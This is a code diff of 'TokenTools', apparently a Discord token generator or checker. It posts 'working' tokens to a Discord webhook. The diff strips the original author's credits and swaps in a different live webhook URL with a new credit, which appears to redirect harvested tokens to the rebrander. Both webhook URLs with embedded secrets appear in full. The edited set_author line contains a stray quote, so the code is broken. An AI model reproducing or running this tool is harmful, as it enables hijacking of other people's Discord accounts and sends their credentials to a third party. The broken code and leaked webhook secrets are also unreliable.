@@ -1,7 +1,4 @@
-#TokenTools
-#Made by: Matty#8952
-#Github: MattyTM
-#Discord server: https://discord.gg/CJWW7DW
+
 import random
 import string
 import pathlib
@@ -23,13 +20,11 @@ def Spinner():
 
 Spinner()
 
-webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/746381428547256322/xVUIQqKOUkqyFp7bX7mxi-txe8bhAFhKlvqRSpL6f3NeX-KR2h5uCOCtlM85OFUIoEq5')
+webhook = DiscordWebhook(url='https://discord.com/api/webhooks/752511231906021467/ihbTgPTikrYw5EgfSrSJYphj5OdnGlraDwf0Q1qdY38qJew0eHv9KfzYqN5m1WRjB0wV')
 embed = DiscordEmbed(title='Nuevo Token Funcional', description='', color=242424)
-embed.set_author(name='TokenTools', url='https://www.github.com/MattyTM', icon_url='https://cdn.icon-icons.com/icons2/1381/PNG/512/discordcanary_94568.png')
-embed.set_thumbnail(url='https://cdn.icon-icons.com/icons2/894/PNG/512/Tick_Mark_icon-icons.com_69146.png')
-embed.set_footer(text='Hecho por: Matty#8952')
+embed.set_author(name='TokenTools', ', icon_url='https://cdn.icon-icons.com/icons2/1381/PNG/512/discordcanary_94568.png')
+embed.set_footer(text='By A39aR')
 embed.set_timestamp()
-embed.add_embed_field(name='Discord Server', value='https://discord.gg/CJWW7DW')
 webhook.add_embed(embed)
 
 banner = (Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]\n"+ 
